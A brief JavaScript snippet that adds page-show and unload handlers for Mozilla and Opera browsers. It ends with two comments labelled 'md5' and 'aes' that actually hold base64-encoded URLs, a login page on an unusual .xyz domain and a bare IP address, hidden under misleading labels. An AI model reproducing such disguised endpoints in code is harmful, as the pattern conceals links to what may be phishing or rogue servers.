if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cHM6Ly93d3cuaGJmbHJydHNvdnN2YzY3Lnh5ei93YXAvIy9sb2dpbg==**//** aes:aHR0cDovLzE2LjE2Mi4xMDUuMTQ1**/